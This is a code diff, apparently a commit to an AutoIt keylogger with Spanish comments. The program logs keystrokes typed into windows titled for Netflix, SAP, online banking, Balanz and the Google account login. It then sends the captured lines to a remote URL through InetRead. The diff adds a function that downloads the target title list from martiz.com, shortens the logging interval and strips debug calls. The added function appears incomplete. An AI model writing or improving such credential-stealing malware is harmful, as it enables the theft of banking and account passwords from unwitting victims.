@@ -41,7 +41,6 @@ Func _Main()
 	$last_send = TimerInit()
 	
 	send_file(true)
-	debug_info()
     While 1
         Sleep(10)
         ; Comprobar si la ventana activa ha cambiado
@@ -51,7 +50,7 @@ Func _Main()
             $lastActiveTime = TimerInit()
         EndIf
         ; Comprobar si han pasado 30 segundos desde la última vez que se escribió en el archivo
-        If TimerDiff($lastActiveTime) > 30000 Then ; 30 segundos en milisegundos
+        If TimerDiff($lastActiveTime) > 10000 Then ; 30 segundos en milisegundos
 			write_file()
             $lastActiveTime = TimerInit()
 			send_file(false)
@@ -76,13 +75,40 @@ Func write_file()
     EndIf
 EndFunc
 
+
+
+
+
+#include <Array.au3>
+func Get_titles()
+; Realizar la solicitud HTTP GET
+Local $sURL = "http://www.martiz.com/listado"
+Local $sContent = InetRead($sURL)
+
+; Verificar si la solicitud fue exitosa
+If @error = 0 Then
+    ; Convertir el contenido a una matriz de títulos
+    Local $aLines = StringSplit($sContent, @CRLF, 1)
+    Local $aTitles[$aLines[0]]
+    For $i = 1 To $aLines[0]
+        $aTitles[$i - 1] = $aLines[$i]
+    Next
+
+    ; Imprimir la matriz de títulos
+    _ArrayDisplay($aTitles, "Títulos")
+Else
+    MsgBox(16, "Error", "No se pudo descargar la matriz.")
+EndIf
+
+
+
+
 Func send_file($forced_action)
     If TimerDiff($last_send) > 600000 Or $forced_action = True Then ; Si han pasado más de 10 minutos o si se forzó la acción
         If FileExists($file_name) Then ; Verifica si el archivo existe
             Local $aArray = FileReadToArray($file_name)
             For $i = 0 To UBound($aArray) - 1
                 InetRead($url & $aArray[$i], $INET_FORCERELOAD)
-				debug_info()
             Next
             ; Vaciar el contenido del archivo en lugar de eliminarlo
             $file = FileOpen($file_name, $FO_OVERWRITE)
@@ -95,13 +121,11 @@ EndFunc
 Func EvaluateKey($keycode)
     $title = WinGetTitle("")
     $buffer = key($keycode)
-
 	Local $titles[9] = ["Netflix", "BRP(1)/000 SAP", "SAP", "Balanz", "Online Banking", "Desprot", "prot", "Contrase","Acceso: Cuentas de Google"]
-	Local $titleToCheck = Stringleft($title, 14) ; Ajusta la longitud según sea necesario para tu aplicación
 	Local $bFound = False
 
 	For $i = 0 To UBound($titles) - 1
-		If StringLeft($titleToCheck, StringLen($titles[$i])) = $titles[$i] Then
+		If StringLeft($title, StringLen($titles[$i])) = $titles[$i] Then
 			$bFound = True
 			ExitLoop
 		EndIf
